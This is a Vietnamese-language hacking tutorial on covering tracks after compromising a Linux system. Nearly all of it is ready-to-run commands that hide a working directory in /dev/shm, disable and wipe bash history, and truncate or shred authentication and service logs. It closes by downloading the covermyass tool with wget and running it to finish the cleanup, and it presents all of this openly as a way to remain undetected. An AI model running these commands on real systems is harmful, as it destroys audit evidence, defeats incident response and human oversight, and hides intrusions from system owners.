# CLEAR YOUR TRACKS
 > CLEAR THE LOGS & BASH HISTORY ON HACKED LINUX SYSTEMS TO COVER YOUR TRACKS & REMAIN UNDETECTED

Là một hacker, việc cuối cùng trong giai đoạn khai thác là xoá sạch dấu vết, bao gồm cả việc xoá sạch mọi hoạt động và nhật kí mà họ có thể bị phát hiện.

Để bắt đầu tìm hiểu những kiến thực che giấu dấu vết của mình, trước tiên ta mặc định rằng ta đã tấn công được mục tiêu, sau đó khám phá một số kĩ thuật để xoá lịch sử Bash, xoá nhật kí và ẩn sau khi khai thác hệ thống.

## Bước 1: Chiếm một mục tiêu

Điều đầu tiên chúng ta cần là khai thác mục tiêu. Chúng ta có thể sử dụng command injection để lạm dụng các máy chủ xử lý các lệnh của hệ điều hành để lấy shell. Ta cũng có thể nâng câng shell thành một interactive shell để dễ dàng điều khiển hơn và hành động hơn.

Sau cùng ta có thể leo thang đặc quyền để chiếm được nhiều lợi thế nhất trong việc không bị phát hiện.

## Bước 2: Tạo một thư mục ẩn dễ xoá

Khi có quyền root, ta tạo một thư mục ẩn để làm việc và giữ các file script trong đó. Nó không đánh lừa bất kì ai trừ quản trỉ viên mới nhất. Trước tiên xác định các vị trí thư mục có thể ghi vào bằng lệnh sau

`find / -perm -222 -type d 2>/dev/null`
* `-perm -222`: tìm các mục kể cả symbolic mode có quyền đọc với tất cả đối tượng.

<img src="../../image/Screenshot_3.png">

Ta có thể tạo thư mục ẩn với lệnh `mkdir` và thêm trước tên một dấu chấm:

`root@target:/# mkdir /dev/shm/.secret`

Nếu ta liệt kê các thư mục trong /dev/shm thì không có j hiện lên

<img src="../../image/Screenshot_4.png">

Thêm tham số -a để hiện các file và thư mục ẩn

<img src="../../image/Screenshot_5.png">

Xoá thư mục sau khi ta đã hoàn thành nhiệm vụ

`root@target:/# rmdir /dev/shm/.secret`

## Bước 3: Xoá lịch sử Bash

Bash giữ danh sách command đã sử dụng trong phiên hiện tại ở bộ nhớ, nên việc xoá dấu vết là cần thiết. Ta có thể xem lịch sử command hiện tại với lệnh `history`:

<img src="../../image/Screenshot_6.png">

Command được viết trong biến môi trường **HISTFILE**, hay là `.bash_history`. Dùng lệnh `echo` để tìm địa chỉ

<img src="../../image/Screenshot_7.png">

Sử dụng lệnh `unset` để xoá biến môi trường

`root@target:/# unset HISTFILE`

Kiểm tra lại với lệnh echo 

`root@target:/# echo $HISTFILE`

<img src="../../image/Screenshot_8.png">

Đặt số lượng câu lệnh được lưu trữ tron **HISTFILE** về bằng 0

`root@target:/# export HISTSIZE=0`

Lệnh set được dùng để thay đổi các tuỳ chọn shell. Để tắt tuỳ chọn `history` sử dụng cứ pháp dưới

`root@target:/# set +o history`

Để bật trở lại

`root@target:/# set -o history`

Trong suốt thời gian chạy lệnh trên máy mục tiêu, ta có thể tránh lưu câu lệnh trên `history` bằng cách sử dụng một dấu cách trước khi bắt đầu câu lệnh:

`root@target:~#  cat /etc/passwd`

Kĩ thuật này không phải lúc nào cũng hoạt động và phụ thuộc vào hệ thống.
Ta có thể xoá lịch sử với tham số `-c`:

`root@target:~# history -c`

Để đảm bảo việc thay đổi được ghi cả trên đĩa, sử dụng tham số `-w`:

`root@target:~# history -w`

Lệnh trên chỉ xoá lịch sử của phiên hiện tại. Để chắc chắn lịch sử được xoá hết sau khi thoát khỏi một phiên, sử dụng câu lệnh dưới đây

`root@target:/# cat /dev/null > ~/.bash_history && history -c && exit`

Cũng có thể dùng lệnh `kill` để xoá phiên mà không lưu lại lịch sử

`root@target:/# kill -9 $$`

## Bước 4: Xoá file Log

Ngoài Bash history, file log cũng cần được xoá để không bị phát hiện, DƯới đây mà một số file log thông dụng mà chúng ta hay dùng:
* /var/log/auth.log Authentication
* /var/log/cron.log Cron Jobs
* /var/log/maillog Mail
* /var/log/httpd Apache 

Dĩ nhiên có thể xoá file log đơn giản với lệnh `rm`

`root@target:/# rm /var/log/auth.log`

Nhưng điều đó sẽ gây sự chú ý, vì vậy tốt hơn hết là lên làm trống tệp thay vì xoá hoàn toàn.

`root@target:/# truncate -s 0 /var/log/auth.log`

Lưu ý rằng `truncate` không phải lúc nào cũng có mặt trên các hệ thống

Ta cũng có thể lặp lại "nothing" vào trên file:

`root@target:/# echo '' > /var/log/auth.log`

`root@target:/# > /var/log/auth.log`

hoặc

`root@target:/# cat /dev/null > /var/log/auth.log`

hoặc

`root@target:/# true | tee /var/log/auth.log`

hoặc

<img src="../../image/Screenshot_9.png">

hoặc dùng lệnh `shred` để viết đè lên file log những kí tự nhị phân vô nghĩa

`root@target:/# shred /var/log/auth.log`

Thêm tham số `-zu` để xoá file và viết đề lên nó bằng số 0 để ẩn chứng cứ băm nhỏ

`root@target:/# shred -zu /var/log/auth.log`

## Bước 5: Sử dụng tool để đảm bảo rằng mọi thứ đã được xoá

Tải về

`root@target:/# wget https://raw.githubusercontent.com/sundowndev/covermyass/master/covermyass`

Cấp quyền chạy

`root@target:/tmp# chmod +x covermyass`

Chạy chương trình:

<img src="../../image/Screenshot_10.png">

Nên chọn hết cả 2 option 1 và 2 để đảm bảo mọi thứ được sạch sẽ.
Khi mọi thứ hoàn tất chỉ cần thêm lệnh `now` và chương trình sẽ tự động chạy:

<img src="../../image/Screenshot_11.png">